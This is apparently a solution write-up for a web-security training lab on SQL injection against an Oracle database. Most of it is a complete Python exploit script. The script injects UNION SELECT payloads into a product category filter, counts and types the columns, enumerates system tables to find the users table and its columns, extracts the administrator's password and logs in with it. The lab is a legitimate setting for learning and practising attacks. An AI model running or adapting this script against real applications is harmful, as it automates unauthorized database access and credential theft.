# SQL injection attack, listing the database contents on Oracle

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
>To solve the lab, log in as the `administrator` user.

```python
import requests
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: SQL injection attack, listing the database contents on Oracle
BASE_URL = "https://0a3400a2036c852880ba21cf003b00c9.web-security-academy.net"
PATH = "/filter"
LOGIN_PATH = "/login"

# Construct Full URLs
TARGET_URL = BASE_URL + PATH
LOGIN_URL = BASE_URL + LOGIN_PATH

def get_num_columns(url):
    """
    Determines the number of columns.
    Oracle Requirement: Must use 'FROM dual'.
    """
    for i in range(1, 50):
        nulls = ["NULL"] * i
        null_string = ", ".join(nulls)
        payload = {
            "category": f"' UNION SELECT {null_string} FROM dual -- "
        }
        response = requests.get(url, params=payload)
        if response.status_code == 200:
            print(f"\n[+] Found correct number of columns: {i}")
            return i

def get_txt_columns(url, num_cols):
    """
    Identifies text-compatible columns.
    Oracle Requirement: Must use 'FROM dual'.
    """
    txt_cols = []
    for i in range(num_cols):
        nulls = ["NULL"] * num_cols
        nulls[i] = "'abc'"
        null_string = ", ".join(nulls)
        payload = {
            "category": f"' UNION SELECT {null_string} FROM dual -- "
        }
        response = requests.get(url, params=payload)
        if response.status_code == 200:
            txt_cols.append(i)
    print(f"\n[+] Text columns found at indices: {txt_cols}")
    return txt_cols

def get_users_table(url, num_cols, txt_idx):
    """
    Finds the table name containing user data.
    Ignores default system tables like 'APP_USERS_AND_ROLES'.
    """
    print("\n[*] Hunting for the 'USERS' table...")
    nulls = ["NULL"] * num_cols
    nulls[txt_idx[0]] = "table_name"
    null_string = ", ".join(nulls)
    
    payload = {
        "category": f"' UNION SELECT {null_string} FROM all_tables -- "
    }
    response = requests.get(url, params=payload)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # FIX: Use find_all to grab EVERY potential table
        candidates = soup.find_all(lambda t: t.name in ['th','td'] and "USERS" in t.text)
        
        for tag in candidates:
            # FIX: If it's the specific decoy, skip it!
            if tag.text == "APP_USERS_AND_ROLES":
                continue
            
            # If we are here, it's likely the real table (e.g., USERS_ABC123)
            print(f"[+] Users Table Found: {tag.text}")
            return tag.text
            
    print("[-] Users Table Not found")
    return None

def get_user_columns(url, num_cols, txt_idx, table_name):
    """
    Finds the specific column names for username and password.
    Oracle Requirement: Query 'all_tab_columns' and look for 'COLUMN_NAME'.
    """
    print(f"\n[*] Mapping columns for table '{table_name}'...")
    nulls = ["NULL"] * num_cols
    nulls[txt_idx[0]] = "column_name" # Select the column holding column names
    null_string = ", ".join(nulls)
    
    payload = {
        "category": f"' UNION SELECT {null_string} FROM all_tab_columns WHERE table_name = '{table_name}' -- "
    }
    response = requests.get(url, params=payload)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        # Look for partial matches like 'USERNAME' or 'PASSWORD'
        user_col_tag = soup.find(lambda t: t.name in ['th','td'] and "USER" in t.text)
        pass_col_tag = soup.find(lambda t: t.name in ['th','td'] and "PASS" in t.text)
        
        if user_col_tag and pass_col_tag:
            print(f"[+] Columns Found: {user_col_tag.text} | {pass_col_tag.text}")
            return user_col_tag.text, pass_col_tag.text
        else:
            print("[-] Username And Password Columns Not Found")
            return None

def get_admin_creds(url, num_cols, txt_idx, table_name, col_names):
    """
    Dumps the credentials using the found table and columns.
    """
    print("\n[*] Dumping administrator credentials...")
    nulls = ["NULL"] * num_cols
    nulls[txt_idx[0]] = col_names[0] # Username Column
    nulls[txt_idx[1]] = col_names[1] # Password Column
    null_string = ", ".join(nulls)
    
    payload = {
        "category": f"' UNION SELECT {null_string} FROM {table_name} -- "
    }
    response = requests.get(url, params=payload)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        admintag = soup.find(string="administrator")
        if admintag:
            # Grab the neighbor cell
            pwtag = admintag.find_next('td')
            if pwtag:
                print(f"[+] Admin Password Found: {pwtag.text}")
                return pwtag.text
    return None

def login(url, admin_pw):
    """
    Verifies the exploit by logging in.
    """
    if not admin_pw:
        return

    print("\n[*] Attempting to login as Administrator...")
    s = requests.Session()
    response = s.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token_input = soup.find("input", {"name": "csrf"})
    
    if token_input:
        token = token_input['value']
        login_data = {
            "username": "administrator",
            "password": admin_pw,
            "csrf": token
        }
        response = s.post(url, data=login_data)
        if response.status_code == 200:
            print("[SUCCESS] LOGGED IN AS ADMINISTRATOR!")

# --- Main Execution ---
if __name__ == "__main__":
    column_num = get_num_columns(TARGET_URL)
    if column_num:
        txt_column = get_txt_columns(TARGET_URL, column_num)
        if txt_column:
            users_table = get_users_table(TARGET_URL, column_num, txt_column)
            if users_table:
                users_columns = get_user_columns(TARGET_URL, column_num, txt_column, users_table)
                if users_columns:
                    admin_pw = get_admin_creds(TARGET_URL, column_num, txt_column, users_table, users_columns)
                    login(LOGIN_URL, admin_pw)
```